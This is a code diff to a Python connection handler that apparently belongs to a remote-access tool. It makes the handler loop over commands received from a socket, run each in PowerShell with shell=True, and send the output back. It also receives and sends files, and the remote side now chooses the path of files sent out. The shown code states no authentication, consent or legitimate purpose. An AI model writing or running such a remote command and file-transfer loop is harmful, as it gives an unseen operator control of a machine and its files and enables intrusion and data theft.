@@ -11,18 +11,30 @@ def handleConnection(my_socket):
         user_input = my_socket.recieve_data()
         if (user_input == '1'):
             print("Running Commands")
-            command = my_socket.recieve_data()
-            output = subprocess.run(["powershell" , command] , shell= True , capture_output= True ) 
+            while(True):
 
-            my_socket.send_data(output.stdout.decode("UTF-8"))
+                command = my_socket.recieve_data()
+                if (command == '##stop##'):
+                    break
+                print(command)
+                output = subprocess.run(["powershell" , command] , shell= True , capture_output= True )
+                output = output.stdout.decode("UTF-8")
+                if (output== "" ):
+                    output = os.getcwd()
+                
+                my_socket.send_data(output)
+
+                 
+
+            
 
         elif (user_input == "2"):
             print("Waiting for files : ")
             my_socket.download_file()
 
         elif (user_input == "3"):
-            path = input("Enter file path")
-            my_socket.upload_file(path)
+
+            my_socket.upload_file()
             
 
             
